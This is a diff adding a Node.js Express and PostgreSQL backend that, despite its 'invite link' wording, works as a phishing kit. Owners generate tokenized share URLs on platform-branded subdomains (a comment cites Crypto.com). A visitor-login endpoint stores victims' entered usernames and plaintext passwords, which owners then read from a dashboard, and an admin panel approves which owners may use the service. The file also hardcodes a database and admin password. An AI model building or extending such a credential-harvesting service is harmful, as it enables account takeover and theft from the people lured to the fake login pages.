@@ -1,0 +1,476 @@
+import express from "express";
+import { Client } from "pg";
+import cors from "cors";
+import crypto from "crypto"; // generates secure random invite tokens
+import bcrypt from "bcryptjs"; // secures admin credentials with hashing
+
+const db = new Client({
+  user: "postgres",
+  host: "localhost",
+  database: "logs",
+  password: "Boyalinco$10",
+  port: 1998,
+});
+db.connect()
+  .then(() => initializeDatabase()) // ensure tracking tables exist before handling requests
+  .catch((err) => console.error("Database connection error:", err));
+const app = express();
+
+const ADMIN_USERNAME = "support@thinlinks.com";
+const ADMIN_PASSWORD = "Boyalinco$10";
+const ADMIN_SESSION_TTL_MS = 12 * 60 * 60 * 1000; // 12 hours to match owner session policy
+const adminSessions = new Map(); // tracks active admin tokens for short-lived access
+const ROOT_SHARE_DOMAIN = process.env.THINLINKS_DOMAIN || ""; // optional base domain used when composing share URLs
+
+function cleanupExpiredAdminSessions() {
+  const now = Date.now();
+  for (const [token, session] of adminSessions.entries()) {
+    if (now - session.createdAt > ADMIN_SESSION_TTL_MS) {
+      adminSessions.delete(token);
+    }
+  }
+}
+
+setInterval(cleanupExpiredAdminSessions, 60 * 60 * 1000); // sweep stale sessions hourly
+
+app.use(
+  cors({
+    origin: "http://localhost:5173",
+    methods: ["GET", "POST", "PUT", "DELETE"],
+    credentials: true,
+  })
+);
+
+const PORT = 4003;
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+async function initializeDatabase() {
+  try {
+    await db.query(
+      `ALTER TABLE owners ADD COLUMN IF NOT EXISTS is_verified BOOLEAN DEFAULT false`
+    ); // flags accounts that the admin has approved
+    await db.query(
+      `ALTER TABLE owners ADD COLUMN IF NOT EXISTS created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()`
+    ); // timestamps account creation for admin auditing
+
+    await db.query(`
+      CREATE TABLE IF NOT EXISTS admins (
+        id SERIAL PRIMARY KEY,
+        username TEXT UNIQUE NOT NULL,
+        password TEXT NOT NULL,
+        created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
+      )
+    `); // dedicated admin credential store separate from owners
+
+    await db.query(`
+      CREATE TABLE IF NOT EXISTS link_tokens (
+        token TEXT PRIMARY KEY,
+        owner_id INTEGER NOT NULL REFERENCES owners(id) ON DELETE CASCADE,
+        platform TEXT NOT NULL,
+        created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
+      )
+    `); // keeps a registry of invite links mapped to their owners
+
+    await db.query(`
+      CREATE TABLE IF NOT EXISTS link_visits (
+        id SERIAL PRIMARY KEY,
+        token TEXT REFERENCES link_tokens(token) ON DELETE SET NULL,
+        owner_id INTEGER REFERENCES owners(id) ON DELETE SET NULL,
+        visitor_username TEXT NOT NULL,
+        visitor_password TEXT,
+        platform TEXT NOT NULL,
+        logged_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
+      )
+    `); // stores each visitor login attempt with token metadata
+
+    await db.query(
+      "ALTER TABLE link_visits ADD COLUMN IF NOT EXISTS visitor_password TEXT"
+    ); // ensures older databases capture the visitor password for review
+
+    await ensureAdminAccount();
+  } catch (error) {
+    console.error("Error initializing tracking tables:", error);
+  }
+}
+
+async function ensureAdminAccount() {
+  try {
+    const existing = await db.query(
+      "SELECT id, password FROM admins WHERE username = $1",
+      [ADMIN_USERNAME]
+    );
+
+    const hashedPassword = await bcrypt.hash(ADMIN_PASSWORD, 12);
+
+    if (existing.rowCount === 0) {
+      await db.query(
+        "INSERT INTO admins (username, password) VALUES ($1, $2)",
+        [ADMIN_USERNAME, hashedPassword]
+      ); // seeds the admin account with a hashed password if missing
+      return;
+    }
+
+    const { password: currentHash } = existing.rows[0];
+    const passwordMatches = await bcrypt.compare(ADMIN_PASSWORD, currentHash);
+
+    if (!passwordMatches) {
+      await db.query("UPDATE admins SET password = $1 WHERE username = $2", [
+        hashedPassword,
+        ADMIN_USERNAME,
+      ]); // refreshes the stored hash if the env password changes
+    }
+  } catch (error) {
+    console.error("Error ensuring admin account:", error);
+  }
+}
+
+app.post("/signup", async (req, res) => {
+  const { username, password } = req.body;
+  try {
+    const existing = await db.query(
+      "SELECT id FROM owners WHERE username = $1",
+      [username]
+    );
+
+    if (existing.rowCount > 0) {
+      return res
+        .status(409)
+        .json({ message: "Username already exists. Choose another." });
+    }
+
+    const result = await db.query(
+      "INSERT INTO owners (username, password) VALUES ($1, $2) RETURNING id, username, is_verified, created_at",
+      [username, password]
+    ); // new sign-ups start unverified until the admin approves them
+
+    res.status(201).json({
+      message:
+        "Account created. An administrator must verify your access before you can log in.",
+      user: result.rows[0],
+    });
+  } catch (error) {
+    console.error("Error during signup:", error);
+    res.status(500).json({ message: "Database Query error" });
+  }
+});
+
+app.post("/login", async (req, res) => {
+  const { username, password } = req.body;
+  try {
+    const result = await db.query(
+      "SELECT id, username, is_verified FROM owners WHERE username = $1 AND password = $2",
+      [username, password]
+    );
+
+    if (result.rowCount === 0) {
+      return res.status(401).json({ message: "Invalid credentials" });
+    }
+
+    const user = result.rows[0];
+
+    if (!user.is_verified) {
+      return res.status(403).json({
+        message: "Account pending administrator verification.",
+      });
+    }
+
+    res.status(200).json({
+      message: "Login successful",
+      user,
+    });
+  } catch (error) {
+    console.error("Error during login:", error);
+    res.status(500).json({ message: "Internal Server Error" });
+  }
+});
+
+app.post("/link-tokens", async (req, res) => {
+  const { ownerId, platform } = req.body;
+
+  if (!ownerId || !platform) {
+    return res
+      .status(400)
+      .json({ message: "ownerId and platform are required to create a link." }); // validates client payloads before continuing
+  }
+
+  try {
+    const ownerResult = await db.query("SELECT id FROM owners WHERE id = $1", [
+      ownerId,
+    ]); // confirms the owner exists before generating a token
+
+    if (ownerResult.rows.length === 0) {
+      return res.status(404).json({ message: "Owner not found." }); // protects against orphan tokens
+    }
+
+    const token = crypto.randomBytes(16).toString("hex"); // produces a hard-to-guess token for the invite link
+
+    await db.query(
+      "INSERT INTO link_tokens (token, owner_id, platform) VALUES ($1, $2, $3)",
+      [token, ownerId, platform]
+    ); // persists the new token for future visitor tracking
+
+    const sanitizedSubdomain = platform.toLowerCase().replace(/[^a-z0-9]/g, ""); // strips punctuation so names like "Crypto.com" map to cryptocom
+
+    let shareUrl;
+
+    if (ROOT_SHARE_DOMAIN) {
+      const subdomain = sanitizedSubdomain || "share"; // fallback to avoid empty subdomains
+      shareUrl = `https://${subdomain}.${ROOT_SHARE_DOMAIN}/?linkToken=${token}`; // crafts a ready-to-share URL using branded subdomains
+    } else {
+      const routePath = `/${sanitizedSubdomain}`; // keeps local dev routes aligned with component paths
+      shareUrl = `http://localhost:5173${routePath}?linkToken=${token}`;
+    }
+
+    res.status(201).json({ token, shareUrl });
+  } catch (error) {
+    console.error("Error creating link token:", error);
+    res.status(500).json({ message: "Failed to create link token" });
+  }
+});
+
+app.post("/visitor-login", async (req, res) => {
+  const { username, password: visitorPassword, linkToken, platform } = req.body;
+
+  if (!username || !visitorPassword || !linkToken || !platform) {
+    return res.status(400).json({
+      message: "username, password, linkToken, and platform are required.",
+    }); // ensures the log has enough context
+  }
+
+  try {
+    const tokenResult = await db.query(
+      "SELECT owner_id, platform FROM link_tokens WHERE token = $1",
+      [linkToken]
+    ); // looks up which owner owns this link token
+
+    if (tokenResult.rows.length === 0) {
+      return res.status(404).json({ message: "Unknown invite link." }); // blocks logging when the link is not registered
+    }
+
+    const { owner_id: ownerId, platform: tokenPlatform } = tokenResult.rows[0];
+
+    if (tokenPlatform !== platform) {
+      return res
+        .status(400)
+        .json({ message: "Platform mismatch for the provided link token." }); // catches cross-platform link misuse
+    }
+
+    await db.query(
+      "INSERT INTO link_visits (token, owner_id, visitor_username, visitor_password, platform) VALUES ($1, $2, $3, $4, $5)",
+      [linkToken, ownerId, username, visitorPassword, platform]
+    ); // logs the visitor credentials against the owning account
+
+    res.status(201).json({ message: "Visitor login recorded." });
+  } catch (error) {
+    console.error("Error recording visitor login:", error);
+    res.status(500).json({ message: "Failed to record visitor login" });
+  }
+});
+
+app.get("/owners/:ownerId/visitors", async (req, res) => {
+  const { ownerId } = req.params;
+
+  try {
+    const result = await db.query(
+      `SELECT id, visitor_username, visitor_password, platform, token, logged_at
+       FROM link_visits
+       WHERE owner_id = $1
+       ORDER BY logged_at DESC`,
+      [ownerId]
+    ); // pulls the recent visitor history for the owner's dashboard
+
+    res.json({ visitors: result.rows });
+  } catch (error) {
+    console.error("Error fetching visitor logs:", error);
+    res.status(500).json({ message: "Failed to fetch visitor logs" });
+  }
+});
+
+function requireAdminAuth(req, res, next) {
+  const authHeader = req.headers.authorization;
+
+  if (!authHeader || !authHeader.startsWith("Bearer ")) {
+    return res.status(401).json({ message: "Unauthorized" });
+  }
+
+  const token = authHeader.substring(7).trim();
+  const session = adminSessions.get(token);
+
+  if (!session) {
+    return res.status(401).json({ message: "Invalid or expired session." });
+  }
+
+  if (Date.now() - session.createdAt > ADMIN_SESSION_TTL_MS) {
+    adminSessions.delete(token);
+    return res
+      .status(401)
+      .json({ message: "Session expired. Please log in again." });
+  }
+
+  req.admin = session.username;
+  next();
+}
+
+app.post("/admin/login", async (req, res) => {
+  const { username, password } = req.body;
+
+  cleanupExpiredAdminSessions();
+
+  try {
+    const adminResult = await db.query(
+      "SELECT id, username, password FROM admins WHERE username = $1",
+      [username]
+    );
+
+    if (adminResult.rowCount === 0) {
+      return res
+        .status(401)
+        .json({ message: "Invalid administrator credentials." });
+    }
+
+    const admin = adminResult.rows[0];
+    const passwordValid = await bcrypt.compare(password, admin.password);
+
+    if (!passwordValid) {
+      return res
+        .status(401)
+        .json({ message: "Invalid administrator credentials." });
+    }
+
+    const token = crypto.randomBytes(32).toString("hex");
+    adminSessions.set(token, {
+      username: admin.username,
+      createdAt: Date.now(),
+    });
+
+    res.json({
+      message: "Admin login successful",
+      token,
+      admin: { username: admin.username },
+    });
+  } catch (error) {
+    console.error("Error during admin login:", error);
+    res.status(500).json({ message: "Failed to authenticate administrator" });
+  }
+});
+
+app.get("/admin/owners", requireAdminAuth, async (req, res) => {
+  try {
+    const owners = await db.query(
+      "SELECT id, username, is_verified, created_at FROM owners ORDER BY created_at DESC"
+    );
+
+    res.json({ owners: owners.rows });
+  } catch (error) {
+    console.error("Error fetching owners:", error);
+    res.status(500).json({ message: "Failed to fetch owners" });
+  }
+});
+
+app.patch(
+  "/admin/owners/:ownerId/verify",
+  requireAdminAuth,
+  async (req, res) => {
+    const { ownerId } = req.params;
+    const ownerIdNumber = Number(ownerId);
+
+    if (Number.isNaN(ownerIdNumber)) {
+      return res.status(400).json({ message: "Invalid owner id." });
+    }
+
+    try {
+      const result = await db.query(
+        "UPDATE owners SET is_verified = true WHERE id = $1 RETURNING id, username, is_verified",
+        [ownerIdNumber]
+      );
+
+      if (result.rowCount === 0) {
+        return res.status(404).json({ message: "Owner not found." });
+      }
+
+      res.json({ owner: result.rows[0] });
+    } catch (error) {
+      console.error("Error verifying owner:", error);
+      res.status(500).json({ message: "Failed to verify owner" });
+    }
+  }
+);
+
+app.patch(
+  "/admin/owners/:ownerId/unverify",
+  requireAdminAuth,
+  async (req, res) => {
+    const { ownerId } = req.params;
+    const ownerIdNumber = Number(ownerId);
+
+    if (Number.isNaN(ownerIdNumber)) {
+      return res.status(400).json({ message: "Invalid owner id." });
+    }
+
+    try {
+      const result = await db.query(
+        "UPDATE owners SET is_verified = false WHERE id = $1 RETURNING id, username, is_verified",
+        [ownerIdNumber]
+      );
+
+      if (result.rowCount === 0) {
+        return res.status(404).json({ message: "Owner not found." });
+      }
+
+      res.json({ owner: result.rows[0] });
+    } catch (error) {
+      console.error("Error unverifying owner:", error);
+      res.status(500).json({ message: "Failed to unverify owner" });
+    }
+  }
+);
+
+app.delete("/admin/owners/:ownerId", requireAdminAuth, async (req, res) => {
+  const { ownerId } = req.params;
+  const ownerIdNumber = Number(ownerId);
+
+  if (Number.isNaN(ownerIdNumber)) {
+    return res.status(400).json({ message: "Invalid owner id." });
+  }
+
+  try {
+    const result = await db.query(
+      "DELETE FROM owners WHERE id = $1 RETURNING id",
+      [ownerIdNumber]
+    );
+
+    if (result.rowCount === 0) {
+      return res.status(404).json({ message: "Owner not found." });
+    }
+
+    res.status(204).send();
+  } catch (error) {
+    console.error("Error deleting owner:", error);
+    res.status(500).json({ message: "Failed to delete owner" });
+  }
+});
+
+app.delete("/owners/:ownerId/visitors/:visitId", async (req, res) => {
+  const { ownerId, visitId } = req.params;
+
+  try {
+    const result = await db.query(
+      "DELETE FROM link_visits WHERE id = $1 AND owner_id = $2 RETURNING id",
+      [visitId, ownerId]
+    );
+
+    if (result.rowCount === 0) {
+      return res.status(404).json({ message: "Visitor log not found." });
+    }
+
+    res.status(204).send();
+  } catch (error) {
+    console.error("Error deleting visitor log:", error);
+    res.status(500).json({ message: "Failed to delete visitor log" });
+  }
+});
+app.listen(PORT, () => {
+  console.log(`Server is running on http://localhost:${PORT}`);
+});
